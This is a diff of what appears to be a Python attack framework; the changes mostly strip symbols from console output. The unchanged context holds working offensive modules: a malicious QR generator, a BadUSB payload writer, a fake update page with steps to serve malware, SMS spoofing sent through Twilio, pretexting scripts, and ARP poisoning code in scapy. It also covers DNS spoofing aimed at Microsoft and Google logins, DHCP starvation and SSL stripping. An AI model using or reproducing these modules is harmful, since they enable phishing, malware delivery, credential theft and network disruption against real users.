-            print(f"{Fore.RED}✗ Template '{template_name}' not found{Style.RESET_ALL}")
+            print(f"{Fore.RED} Template '{template_name}' not found{Style.RESET_ALL}")
             print(f"{Fore.YELLOW}Available templates: {', '.join(templates.keys())}{Style.RESET_ALL}")
             return
         
         template = templates[template_name]
-        print(f"{Fore.GREEN}✓ Template: {Fore.WHITE}{template['name']}{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}  Category: {Fore.WHITE}{template['category']}{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}  Subject: {Fore.WHITE}{template['subject']}{Style.RESET_ALL}\n")
+        print(f"{Fore.GREEN} Template: {Fore.WHITE}{template['name']}{Style.RESET_ALL}")
+        print(f"{Fore.CYAN} Category: {Fore.WHITE}{template['category']}{Style.RESET_ALL}")
+        print(f"{Fore.CYAN} Subject: {Fore.WHITE}{template['subject']}{Style.RESET_ALL}\n")
         
         # Confirmation prompt
         if config.get('auto_execute', 'false') != 'true':
@@ -19256,7 +19256,7 @@ tr:hover {{ background: #f8f9fa; }}
         if config.get('export_results', 'true') == 'true':
             self._export_mass_mailer_results(config, campaign_id)
         
-        print(f"\n{Fore.GREEN}✓ Mass mailer campaign completed successfully{Style.RESET_ALL}\n")
+        print(f"\n{Fore.GREEN} Mass mailer campaign completed successfully{Style.RESET_ALL}\n")
     
     def run_qr_generator(self):
         """Malicious QR code generator"""
@@ -19265,7 +19265,7 @@ tr:hover {{ background: #f8f9fa; }}
         size = int(self.module_options.get('size', '300'))
         
         print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}║          QR CODE GENERATOR                       ║{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}║ QR CODE GENERATOR ║{Style.RESET_ALL}")
         print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
         
         print(f"{Fore.YELLOW}Target URL: {Fore.WHITE}{url}{Style.RESET_ALL}")
@@ -19280,27 +19280,27 @@ tr:hover {{ background: #f8f9fa; }}
             img = qr.make_image(fill_color="black", back_color="white")
             img.save(output)
 
-            print(f"{Fore.GREEN}✓ QR code generated successfully!{Style.RESET_ALL}")
+            print(f"{Fore.GREEN} QR code generated successfully!{Style.RESET_ALL}")
             print(f"{Fore.CYAN}→ Saved to: {Fore.WHITE}{output}{Style.RESET_ALL}\n")
         else:
-            print(f"{Fore.YELLOW}⚠  qrcode library not installed{Style.RESET_ALL}")
-            print(f"{Fore.BLUE}ℹ  Install with: {Fore.CYAN}pip install qrcode[pil]{Style.RESET_ALL}\n")
+            print(f"{Fore.YELLOW} qrcode library not installed{Style.RESET_ALL}")
+            print(f"{Fore.BLUE}ℹ Install with: {Fore.CYAN}pip install qrcode[pil]{Style.RESET_ALL}\n")
 
             # Generate ASCII QR for demo
             print(f"{Fore.CYAN}ASCII Preview (install qrcode for actual image):{Style.RESET_ALL}\n")
-            print(f"  ████████████████  ████  ██████████")
-            print(f"  ██          ██  ██    ██        ██")
-            print(f"  ██  ██████  ██  ████  ██  ████  ██")
-            print(f"  ██  ██████  ██    ██  ██  ████  ██")
-            print(f"  ██  ██████  ██  ██    ██  ████  ██")
-            print(f"  ██          ██  ██████████      ██")
-            print(f"  ████████████████  ██  ██████████\n")
+            print(f" ████████████████ ████ ██████████")
+            print(f" ██ ██ ██ ██ ██")
+            print(f" ██ ██████ ██ ████ ██ ████ ██")
+            print(f" ██ ██████ ██ ██ ██ ████ ██")
+            print(f" ██ ██████ ██ ██ ██ ████ ██")
+            print(f" ██ ██ ██████████ ██")
+            print(f" ████████████████ ██ ██████████\n")
             
-        print(f"{Fore.BLUE}ℹ  Use cases:{Style.RESET_ALL}")
-        print(f"  • Physical security testing")
-        print(f"  • Parking lot drops")
-        print(f"  • Fake WiFi posters")
-        print(f"  • Fake payment terminals{Style.RESET_ALL}")
+        print(f"{Fore.BLUE}ℹ Use cases:{Style.RESET_ALL}")
+        print(f" • Physical security testing")
+        print(f" • Parking lot drops")
+        print(f" • Fake WiFi posters")
+        print(f" • Fake payment terminals{Style.RESET_ALL}")
     
     def run_usb_payload(self):
         """USB payload generator (BadUSB/Rubber Ducky)"""
@@ -19311,7 +19311,7 @@ tr:hover {{ background: #f8f9fa; }}
         output = self.module_options.get('output', 'payload.txt')
         
         print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}║          USB PAYLOAD GENERATOR                   ║{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}║ USB PAYLOAD GENERATOR ║{Style.RESET_ALL}")
         print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
         
         print(f"{Fore.YELLOW}Payload Type: {Fore.WHITE}{payload_type}{Style.RESET_ALL}")
@@ -19378,19 +19378,19 @@ ENTER
             with open(output, 'w') as f:
                 f.write(payload)
             
-            print(f"{Fore.GREEN}✓ Payload generated!{Style.RESET_ALL}")
+            print(f"{Fore.GREEN} Payload generated!{Style.RESET_ALL}")
             print(f"{Fore.CYAN}→ Saved to: {Fore.WHITE}{output}{Style.RESET_ALL}\n")
             print(f"{Fore.BLUE}Preview:{Style.RESET_ALL}\n{Fore.CYAN}{payload[:300]}...{Style.RESET_ALL}\n")
             
         except Exception as e:
-            print(f"{Fore.RED}✗ Error saving payload: {str(e)}{Style.RESET_ALL}\n")
+            print(f"{Fore.RED} Error saving payload: {str(e)}{Style.RESET_ALL}\n")
         
-        print(f"{Fore.YELLOW}⚠  Devices:{Style.RESET_ALL}")
-        print(f"  • USB Rubber Ducky")
-        print(f"  • Bash Bunny")
-        print(f"  • Teensy")
-        print(f"  • Arduino-based BadUSB")
-        print(f"\n{Fore.BLUE}ℹ  Remember to start listener: {Fore.CYAN}use exploit/multi_handler{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW} Devices:{Style.RESET_ALL}")
+        print(f" • USB Rubber Ducky")
+        print(f" • Bash Bunny")
+        print(f" • Teensy")
+        print(f" • Arduino-based BadUSB")
+        print(f"\n{Fore.BLUE}ℹ Remember to start listener: {Fore.CYAN}use exploit/multi_handler{Style.RESET_ALL}")
     
     def run_fake_update(self):
         """Fake software update page generator"""
@@ -19399,7 +19399,7 @@ ENTER
         port = self.module_options.get('port', '8080')
         
         print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}║          FAKE UPDATE GENERATOR                   ║{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}║ FAKE UPDATE GENERATOR ║{Style.RESET_ALL}")
         print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
         
         templates = {
@@ -19478,7 +19478,7 @@ ENTER
 </head>
 <body>
     <div class="update-box">
-        <div class="icon">⚠️</div>
+        <div class="icon">️</div>
         <h1>{template['title']}</h1>
         <p>{template['message']}</p>
         <a href="/{payload}" download>
@@ -19494,19 +19494,19 @@ ENTER
         with open(f"{output_dir}/index.html", 'w') as f:
             f.write(html_content)
         
-        print(f"{Fore.GREEN}✓ Fake update page generated!{Style.RESET_ALL}")
+        print(f"{Fore.GREEN} Fake update page generated!{Style.RESET_ALL}")
         print(f"{Fore.CYAN}→ Location: {Fore.WHITE}{output_dir}/index.html{Style.RESET_ALL}\n")
         
-        print(f"{Fore.YELLOW}⚠  Setup:{Style.RESET_ALL}")
-        print(f"  1. Place payload: {Fore.CYAN}cp malware.exe {output_dir}/{payload}{Style.RESET_ALL}")
-        print(f"  2. Start server: {Fore.CYAN}python3 -m http.server {port} --directory {output_dir}{Style.RESET_ALL}")
-        print(f"  3. Access at: {Fore.CYAN}http://{self.config['lhost']}:{port}{Style.RESET_ALL}\n")
+        print(f"{Fore.YELLOW} Setup:{Style.RESET_ALL}")
+        print(f" 1. Place payload: {Fore.CYAN}cp malware.exe {output_dir}/{payload}{Style.RESET_ALL}")
+        print(f" 2. Start server: {Fore.CYAN}python3 -m http.server {port} --directory {output_dir}{Style.RESET_ALL}")
+        print(f" 3. Access at: {Fore.CYAN}http://{self.config['lhost']}:{port}{Style.RESET_ALL}\n")
         
-        print(f"{Fore.BLUE}ℹ  Delivery methods:{Style.RESET_ALL}")
-        print(f"  • Watering hole attacks")
-        print(f"  • Compromised websites")
-        print(f"  • Malicious ads")
-        print(f"  • Email campaigns")
+        print(f"{Fore.BLUE}ℹ Delivery methods:{Style.RESET_ALL}")
+        print(f" • Watering hole attacks")
+        print(f" • Compromised websites")
+        print(f" • Malicious ads")
+        print(f" • Email campaigns")
     
     def run_sms_spoofing(self):
         """SMS spoofing campaign"""
@@ -19520,7 +19520,7 @@ ENTER
         delay = int(self.module_options.get('delay', '2'))
         
         print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}║          SMS SPOOFING CAMPAIGN                   ║{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}║ SMS SPOOFING CAMPAIGN ║{Style.RESET_ALL}")
         print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
         
         print(f"{Fore.YELLOW}Sender Display: {Fore.WHITE}{sender}{Style.RESET_ALL}")
@@ -19536,17 +19536,17 @@ ENTER
         # Check if Twilio credentials are provided
         if twilio_sid and twilio_token and twilio_number:
             if not TWILIO_AVAILABLE or TwilioClient is None:
-                print(f"{Fore.YELLOW}⚠  Twilio library not installed{Style.RESET_ALL}")
-                print(f"{Fore.BLUE}ℹ  Install with: {Fore.CYAN}pip install twilio{Style.RESET_ALL}\n")
-                print(f"{Fore.BLUE}ℹ  Or use alternative methods below{Style.RESET_ALL}\n")
+                print(f"{Fore.YELLOW} Twilio library not installed{Style.RESET_ALL}")
+                print(f"{Fore.BLUE}ℹ Install with: {Fore.CYAN}pip install twilio{Style.RESET_ALL}\n")
+                print(f"{Fore.BLUE}ℹ Or use alternative methods below{Style.RESET_ALL}\n")
             else:
                 if not os.path.exists(targets_file):
-                    print(f"{Fore.YELLOW}⚠  Target file not found. Creating example file...{Style.RESET_ALL}\n")
+                    print(f"{Fore.YELLOW} Target file not found. Creating example file...{Style.RESET_ALL}\n")
                     with open(targets_file, 'w') as f:
                         f.write("+1234567890,John Doe\n")
                         f.write("+0987654321,Jane Smith\n")
-                    print(f"{Fore.GREEN}✓ Created example file: {targets_file}{Style.RESET_ALL}")
-                    print(f"{Fore.BLUE}ℹ  Edit the file and run again{Style.RESET_ALL}\n")
+                    print(f"{Fore.GREEN} Created example file: {targets_file}{Style.RESET_ALL}")
+                    print(f"{Fore.BLUE}ℹ Edit the file and run again{Style.RESET_ALL}\n")
                     return
 
                 targets = []
@@ -19560,10 +19560,10 @@ ENTER
                             targets.append({'phone': phone, 'name': name})
 
                 if not targets:
-                    print(f"{Fore.RED}✗ No targets found in {targets_file}{Style.RESET_ALL}\n")
+                    print(f"{Fore.RED} No targets found in {targets_file}{Style.RESET_ALL}\n")
                     return
 
-                print(f"{Fore.GREEN}✓ Loaded {len(targets)} target(s){Style.RESET_ALL}\n")
+                print(f"{Fore.GREEN} Loaded {len(targets)} target(s){Style.RESET_ALL}\n")
 
                 client = TwilioClient(twilio_sid, twilio_token)
                 print(f"{Fore.CYAN}┌─[ SENDING SMS ]───────────────────────────{Style.RESET_ALL}")
@@ -19579,29 +19579,29 @@ ENTER
                             from_=twilio_number,
                             to=target['phone']
                         )
-                        print(f"{Fore.GREEN}│ [{i}/{len(targets)}] ✓ Sent to {target['phone']} ({target['name']}) - SID: {message_obj.sid[:20]}...{Style.RESET_ALL}")
+                        print(f"{Fore.GREEN}│ [{i}/{len(targets)}] Sent to {target['phone']} ({target['name']}) - SID: {message_obj.sid[:20]}...{Style.RESET_ALL}")
                         success_count += 1
                         if i < len(targets):
                             time.sleep(delay)
                     except Exception as e:
-                        print(f"{Fore.RED}│ [{i}/{len(targets)}] ✗ Failed to {target['phone']} - Error: {str(e)[:50]}{Style.RESET_ALL}")
+                        print(f"{Fore.RED}│ [{i}/{len(targets)}] Failed to {target['phone']} - Error: {str(e)[:50]}{Style.RESET_ALL}")
                         fail_count += 1
 
                 print(f"{Fore.CYAN}└────────────────────────────────────────────{Style.RESET_ALL}\n")
                 print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
-                print(f"{Fore.CYAN}║          CAMPAIGN SUMMARY                        ║{Style.RESET_ALL}")
+                print(f"{Fore.CYAN}║ CAMPAIGN SUMMARY ║{Style.RESET_ALL}")
                 print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
-                print(f"{Fore.GREEN}✓ Successfully sent: {success_count}{Style.RESET_ALL}")
-                print(f"{Fore.RED}✗ Failed: {fail_count}{Style.RESET_ALL}")
+                print(f"{Fore.GREEN} Successfully sent: {success_count}{Style.RESET_ALL}")
+                print(f"{Fore.RED} Failed: {fail_count}{Style.RESET_ALL}")
                 print(f"{Fore.YELLOW}Total targets: {len(targets)}{Style.RESET_ALL}\n")
                 
         else:
-            print(f"{Fore.YELLOW}⚠  Twilio credentials not configured{Style.RESET_ALL}\n")
-            print(f"{Fore.BLUE}ℹ  Configure with:{Style.RESET_ALL}")
-            print(f"{Fore.CYAN}  set twilio_sid <your_account_sid>")
-            print(f"  set twilio_token <your_auth_token>")
-            print(f"  set twilio_number <your_twilio_number>{Style.RESET_ALL}\n")
-            print(f"{Fore.BLUE}ℹ  Get credentials from: https://www.twilio.com/console{Style.RESET_ALL}\n")
+            print(f"{Fore.YELLOW} Twilio credentials not configured{Style.RESET_ALL}\n")
+            print(f"{Fore.BLUE}ℹ Configure with:{Style.RESET_ALL}")
+            print(f"{Fore.CYAN} set twilio_sid <your_account_sid>")
+            print(f" set twilio_token <your_auth_token>")
+            print(f" set twilio_number <your_twilio_number>{Style.RESET_ALL}\n")
+            print(f"{Fore.BLUE}ℹ Get credentials from: https://www.twilio.com/console{Style.RESET_ALL}\n")
         
         # Show example templates
         print(f"{Fore.GREEN}Example SMS templates:{Style.RESET_ALL}\n")
@@ -19616,17 +19616,17 @@ ENTER
         
         for i, (name, template) in enumerate(templates, 1):
             print(f"{Fore.CYAN}{i}. {name}:{Style.RESET_ALL}")
-            print(f"   {Fore.WHITE}{template}{Style.RESET_ALL}\n")
+            print(f" {Fore.WHITE}{template}{Style.RESET_ALL}\n")
         
-        print(f"{Fore.BLUE}ℹ  Alternative implementation methods:{Style.RESET_ALL}")
-        print(f"  • Twilio API (recommended - supports sender ID in some countries)")
-        print(f"  • Nexmo/Vonage API")
-        print(f"  • AWS SNS (limited sender ID support)")
-        print(f"  • SMS gateway providers")
-        print(f"\n{Fore.BLUE}ℹ  Target file format ({targets_file}):{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}  +1234567890,John Doe")
-        print(f"  +0987654321,Jane Smith")
-        print(f"  +4412345678,Alice Brown{Style.RESET_ALL}")
+        print(f"{Fore.BLUE}ℹ Alternative implementation methods:{Style.RESET_ALL}")
+        print(f" • Twilio API (recommended - supports sender ID in some countries)")
+        print(f" • Nexmo/Vonage API")
+        print(f" • AWS SNS (limited sender ID support)")
+        print(f" • SMS gateway providers")
+        print(f"\n{Fore.BLUE}ℹ Target file format ({targets_file}):{Style.RESET_ALL}")
+        print(f"{Fore.CYAN} +1234567890,John Doe")
+        print(f" +0987654321,Jane Smith")
+        print(f" +4412345678,Alice Brown{Style.RESET_ALL}")
     
     def run_pretexting(self):
         """Pretexting scenario generator"""
@@ -19635,7 +19635,7 @@ ENTER
         urgency = self.module_options.get('urgency', 'high')
         
         print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}║          PRETEXTING SCENARIO GENERATOR           ║{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}║ PRETEXTING SCENARIO GENERATOR ║{Style.RESET_ALL}")
         print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
         
         scenarios = {
@@ -19697,12 +19697,12 @@ ENTER
             print(f"{Fore.WHITE}\"{s['alternative']}\"{Style.RESET_ALL}\n")
             
             print(f"{Fore.CYAN}═══ TIPS ═══{Style.RESET_ALL}\n")
-            print(f"  • Use confident, authoritative tone")
-            print(f"  • Build rapport before making requests")
-            print(f"  • Create time pressure with urgency")
-            print(f"  • Use company-specific terminology")
-            print(f"  • Have plausible answers for questions")
-            print(f"  • Know when to abandon if suspicious\n")
+            print(f" • Use confident, authoritative tone")
+            print(f" • Build rapport before making requests")
+            print(f" • Create time pressure with urgency")
+            print(f" • Use company-specific terminology")
+            print(f" • Have plausible answers for questions")
+            print(f" • Know when to abandon if suspicious\n")
     
     # ============ NETWORK ATTACK MODULES ============
     
@@ -19713,7 +19713,7 @@ ENTER
         interface = self.module_options.get('interface', 'eth0')
         
         print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}║          ARP SPOOFING ATTACK                     ║{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}║ ARP SPOOFING ATTACK ║{Style.RESET_ALL}")
         print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
         
         print(f"{Fore.YELLOW}Target: {Fore.WHITE}{target_ip}{Style.RESET_ALL}")
@@ -19721,39 +19721,39 @@ ENTER
         print(f"{Fore.YELLOW}Interface: {Fore.WHITE}{interface}{Style.RESET_ALL}\n")
         
         if not SCAPY_AVAILABLE:
-            print(f"{Fore.RED}✗ Scapy not available{Style.RESET_ALL}")
-            print(f"{Fore.BLUE}ℹ  Install: {Fore.CYAN}pip install scapy{Style.RESET_ALL}\n")
+            print(f"{Fore.RED} Scapy not available{Style.RESET_ALL}")
+            print(f"{Fore.BLUE}ℹ Install: {Fore.CYAN}pip install scapy{Style.RESET_ALL}\n")
             return
         
-        print(f"{Fore.YELLOW}⚠  Prerequisites:{Style.RESET_ALL}")
-        print(f"  1. Enable IP forwarding:")
-        print(f"     {Fore.CYAN}echo 1 > /proc/sys/net/ipv4/ip_forward{Style.RESET_ALL}")
-        print(f"  2. Run as root{Style.RESET_ALL}\n")
+        print(f"{Fore.YELLOW} Prerequisites:{Style.RESET_ALL}")
+        print(f" 1. Enable IP forwarding:")
+        print(f" {Fore.CYAN}echo 1 > /proc/sys/net/ipv4/ip_forward{Style.RESET_ALL}")
+        print(f" 2. Run as root{Style.RESET_ALL}\n")
         
         print(f"{Fore.BLUE}Python implementation:{Style.RESET_ALL}\n")
         print(f"{Fore.CYAN}from scapy.all import ARP, send")
         print(f"import time")
         print(f"")
         print(f"def arp_spoof(target_ip, gateway_ip):")
-        print(f"    target_mac = getmacbyip(target_ip)")
-        print(f"    gateway_mac = getmacbyip(gateway_ip)")
-        print(f"    ")
-        print(f"    # Poison target")
-        print(f"    arp_target = ARP(op=2, pdst=target_ip, hwdst=target_mac,")
-        print(f"                     psrc=gateway_ip)")
-        print(f"    # Poison gateway")
-        print(f"    arp_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,")
-        print(f"                      psrc=target_ip)")
-        print(f"    ")
-        print(f"    while True:")
-        print(f"        send(arp_target, verbose=False)")
-        print(f"        send(arp_gateway, verbose=False)")
-        print(f"        time.sleep(2){Style.RESET_ALL}\n")
+        print(f" target_mac = getmacbyip(target_ip)")
+        print(f" gateway_mac = getmacbyip(gateway_ip)")
+        print(f" ")
+        print(f" # Poison target")
+        print(f" arp_target = ARP(op=2, pdst=target_ip, hwdst=target_mac,")
+        print(f" psrc=gateway_ip)")
+        print(f" # Poison gateway")
+        print(f" arp_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,")
+        print(f" psrc=target_ip)")
+        print(f" ")
+        print(f" while True:")
+        print(f" send(arp_target, verbose=False)")
+        print(f" send(arp_gateway, verbose=False)")
+        print(f" time.sleep(2){Style.RESET_ALL}\n")
         
-        print(f"{Fore.GREEN}ℹ  Once MITM is active, use:{Style.RESET_ALL}")
-        print(f"  • {Fore.CYAN}use network/packet_sniffer{Fore.WHITE} - Capture traffic")
-        print(f"  • {Fore.CYAN}use network/ssl_strip{Fore.WHITE} - Downgrade HTTPS")
-        print(f"  • {Fore.CYAN}use network/dns_spoof{Fore.WHITE} - Redirect domains{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}ℹ Once MITM is active, use:{Style.RESET_ALL}")
+        print(f" • {Fore.CYAN}use network/packet_sniffer{Fore.WHITE} - Capture traffic")
+        print(f" • {Fore.CYAN}use network/ssl_strip{Fore.WHITE} - Downgrade HTTPS")
+        print(f" • {Fore.CYAN}use network/dns_spoof{Fore.WHITE} - Redirect domains{Style.RESET_ALL}")
     
     def run_dns_spoof(self):
         """DNS spoofing attack"""
@@ -19762,7 +19762,7 @@ ENTER
         interface = self.module_options.get('interface', 'eth0')
         
         print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}║          DNS SPOOFING ATTACK                     ║{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}║ DNS SPOOFING ATTACK ║{Style.RESET_ALL}")
         print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
         
         print(f"{Fore.YELLOW}Domain: {Fore.WHITE}{domain}{Style.RESET_ALL}")
@@ -19772,20 +19772,20 @@ ENTER
         print(f"{Fore.BLUE}Tool options:{Style.RESET_ALL}\n")
         
         print(f"{Fore.GREEN}1. Using dnsspoof (dsniff):{Style.RESET_ALL}")
-        print(f"   {Fore.CYAN}echo '{domain} {fake_ip}' > dns.txt")
-        print(f"   sudo dnsspoof -i {interface} -f dns.txt{Style.RESET_ALL}\n")
+        print(f" {Fore.CYAN}echo '{domain} {fake_ip}' > dns.txt")
+        print(f" sudo dnsspoof -i {interface} -f dns.txt{Style.RESET_ALL}\n")
         
         print(f"{Fore.GREEN}2. Using Bettercap:{Style.RESET_ALL}")
-        print(f"   {Fore.CYAN}sudo bettercap -iface {interface}")
-        print(f"   > set dns.spoof.domains {domain}")
-        print(f"   > set dns.spoof.address {fake_ip}")
-        print(f"   > dns.spoof on{Style.RESET_ALL}\n")
+        print(f" {Fore.CYAN}sudo bettercap -iface {interface}")
+        print(f" > set dns.spoof.domains {domain}")
+        print(f" > set dns.spoof.address {fake_ip}")
+        print(f" > dns.spoof on{Style.RESET_ALL}\n")
         
         print(f"{Fore.GREEN}3. Using Scapy:{Style.RESET_ALL}")
-        print(f"   {Fore.CYAN}# Sniff DNS queries and respond with fake IP{Style.RESET_ALL}\n")
+        print(f" {Fore.CYAN}# Sniff DNS queries and respond with fake IP{Style.RESET_ALL}\n")
         
-        print(f"{Fore.YELLOW}⚠  Requires active MITM (ARP spoofing first){Style.RESET_ALL}")
-        print(f"{Fore.BLUE}ℹ  Common targets: login.microsoft.com, accounts.google.com{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW} Requires active MITM (ARP spoofing first){Style.RESET_ALL}")
+        print(f"{Fore.BLUE}ℹ Common targets: login.microsoft.com, accounts.google.com{Style.RESET_ALL}")
     
     def run_dhcp_starvation(self):
         """DHCP starvation attack"""
@@ -19793,23 +19793,23 @@ ENTER
         count = int(self.module_options.get('count', '100'))
         
         print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}║          DHCP STARVATION ATTACK                  ║{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}║ DHCP STARVATION ATTACK ║{Style.RESET_ALL}")
         print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
         
         print(f"{Fore.YELLOW}Interface: {Fore.WHITE}{interface}{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}Requests: {Fore.WHITE}{count}{Style.RESET_ALL}\n")
         
         print(f"{Fore.BLUE}Tool: Yersinia{Style.RESET_ALL}")
-        print(f"  {Fore.CYAN}sudo yersinia -G  # GUI mode")
-        print(f"  # Select DHCP, enable 'Sending DISCOVER packet'{Style.RESET_ALL}\n")
+        print(f" {Fore.CYAN}sudo yersinia -G # GUI mode")
+        print(f" # Select DHCP, enable 'Sending DISCOVER packet'{Style.RESET_ALL}\n")
         
         print(f"{Fore.BLUE}Tool: DHCPig{Style.RESET_ALL}")
-        print(f"  {Fore.CYAN}sudo pig.py {interface}{Style.RESET_ALL}\n")
+        print(f" {Fore.CYAN}sudo pig.py {interface}{Style.RESET_ALL}\n")
         
-        print(f"{Fore.GREEN}ℹ  Impact:{Style.RESET_ALL}")
-        print(f"  • Legitimate clients can't get IP addresses")
-        print(f"  • Prepares for rogue DHCP server")
-        print(f"  • Network-wide disruption{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}ℹ Impact:{Style.RESET_ALL}")
+        print(f" • Legitimate clients can't get IP addresses")
+        print(f" • Prepares for rogue DHCP server")
+        print(f" • Network-wide disruption{Style.RESET_ALL}")
     
     def run_ssl_strip(self):
         """SSL stripping attack"""
@@ -19817,16 +19817,16 @@ ENTER
         port = self.module_options.get('port', '8080')
         
         print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}║          SSL STRIP ATTACK                        ║{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}║ SSL STRIP ATTACK ║{Style.RESET_ALL}")
         print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
         
         print(f"{Fore.YELLOW}Interface: {Fore.WHITE}{interface}{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}Port: {Fore.WHITE}{port}{Style.RESET_ALL}\n")
         
-        print(f"{Fore.YELLOW}⚠  Prerequisites:{Style.RESET_ALL}")
-        print(f"  1. Active MITM (ARP spoofing)")
-        print(f"  2. IP forwarding enabled")
-        print(f"  3. iptables redirect setup\n")
+        print(f"{Fore.YELLOW} Prerequisites:{Style.RESET_ALL}")
+        print(f" 1. Active MITM (ARP spoofing)")
+        print(f" 2. IP forwarding enabled")
+        print(f" 3. iptables redirect setup\n")
         
         print(f"{Fore.BLUE}Setup steps:{Style.RESET_ALL}\n")
         
@@ -19842,11 +19842,11 @@ ENTER
         print(f"# 4. Start ARP spoofing")
         print(f"# use network/arp_spoof{Style.RESET_ALL}\n")
         
-        print(f"{Fore.GREEN}ℹ  What it does:{Style.RESET_ALL}")
-        print(f"  • Intercepts HTTPS requests")
-        print(f"  • Serves HTTP version to victim")
-        print(f"  • Victim sees HTTP, you see credentials")
-        print(f"  • Defeats basic SSL{Style.RESET_ALL}\n")
+        print(f"{Fore.GREEN}ℹ What it does:{Style.RESET_ALL}")
+        print(f" • Intercepts HTTPS requests")
+        print(f" • Serves HTTP version to victim")
+        print(f" • Victim sees HTTP, you see credentials")
+        print(f" • Defeats basic SSL{Style.RESET_ALL}\n")
         
         print(f"{Fore.YELLOW}Note: Modern browsers have HSTS protection{Style.RESET_ALL}")
     
@@ -19858,7 +19858,7 @@ ENTER
         count = int(self.module_options.get('count', '100'))
         
         print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}║          PACKET SNIFFER                          ║{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}║ PACKET SNIFFER ║{Style.RESET_ALL}")
         print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
         
         print(f"{Fore.YELLOW}Interface: {Fore.WHITE}{interface}{Style.RESET_ALL}")
@@ -19867,7 +19867,7 @@ ENTER
         print(f"{Fore.YELLOW}Count: {Fore.WHITE}{count} packets{Style.RESET_ALL}\n")
         
         if not SCAPY_AVAILABLE:
-            print(f"{Fore.RED}✗ Scapy not available{Style.RESET_ALL}\n")
+            print(f"{Fore.RED} Scapy not available{Style.RESET_ALL}\n")
         
         print(f"{Fore.BLUE}Common BPF filters:{Style.RESET_ALL}\n")
         
@@ -19883,19 +19883,19 @@ ENTER
         ]
         
         for f, desc in filters:
-            print(f"  {Fore.GREEN}{f:<40}{Fore.WHITE}{desc}{Style.RESET_ALL}")
+            print(f" {Fore.GREEN}{f:<40}{Fore.WHITE}{desc}{Style.RESET_ALL}")
         
         print(f"\n{Fore.CYAN}Using tcpdump:{Style.RESET_ALL}")
-        print(f"  {Fore.CYAN}sudo tcpdump -i {interface} -w {output} '{filter_str}' -c {count}{Style.RESET_ALL}\n")
+        print(f" {Fore.CYAN}sudo tcpdump -i {interface} -w {output} '{filter_str}' -c {count}{Style.RESET_ALL}\n")
         
         print(f"{Fore.CYAN}Using tshark:{Style.RESET_ALL}")
-        print(f"  {Fore.CYAN}tshark -i {interface} -w {output} -f '{filter_str}' -c {count}{Style.RESET_ALL}\n")
+        print(f" {Fore.CYAN}tshark -i {interface} -w {output} -f '{filter_str}' -c {count}{Style.RESET_ALL}\n")
         
-        print(f"{Fore.GREEN}ℹ  Analysis tools:{Style.RESET_ALL}")
-        print(f"  • Wireshark - GUI analysis")
-        print(f"  • tshark - CLI analysis")
-        print(f"  • NetworkMiner - Extract files/credentials")
-        print(f"  • Bro/Zeek - Network security monitoring{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}ℹ Analysis tools:{Style.RESET_ALL}")
+        print(f" • Wireshark - GUI analysis")
+        print(f" • tshark - CLI analysis")
+        print(f" • NetworkMiner - Extract files/credentials")
+        print(f" • Bro/Zeek - Network security monitoring{Style.RESET_ALL}")
     
     # ============ WEB APPLICATION MODULES ============
     
@@ -19906,25 +19906,25 @@ ENTER
         algorithm = self.module_options.get('algorithm', 'HS256')
         
         print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
